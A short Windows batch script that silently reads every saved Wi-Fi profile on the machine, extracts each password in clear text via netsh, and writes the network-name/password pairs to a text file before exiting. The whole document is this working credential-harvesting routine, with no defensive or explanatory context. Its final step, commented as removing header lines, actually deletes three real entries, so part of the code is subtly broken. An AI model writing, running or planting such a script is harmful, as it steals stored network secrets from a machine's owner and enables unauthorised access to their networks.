@echo off
cd ..
setlocal enabledelayedexpansion
set "OUT=%~dp0wifi.txt"
if exist "%OUT%" del "%OUT%"
for /f "delims=" %%a in ('netsh wlan show profiles 2^>nul ^| findstr /i "All User Profile"') do (
    set "LINE=%%a"
    for /f "tokens=* delims= " %%b in ("!LINE:*: =!") do set "S=%%b"
    if defined S (
        set "P=-"
        for /f "delims=" %%c in ('netsh wlan show profile name^="!S!" key^=clear 2^>nul ^| findstr /i "Key Content"') do (
            set "KL=%%c"
            for /f "tokens=* delims= " %%d in ("!KL:*: =!") do set "P=%%d"
        )
        echo !S!:!P!>>"%OUT%"
    )
)

:: Remove the first 3 lines from the output file
set "TMP=%~dp0wifi_tmp.txt"
(for /f "skip=3 delims=" %%x in ('type "%OUT%"') do echo %%x) > "%TMP%"
move /y "%TMP%" "%OUT%"


exit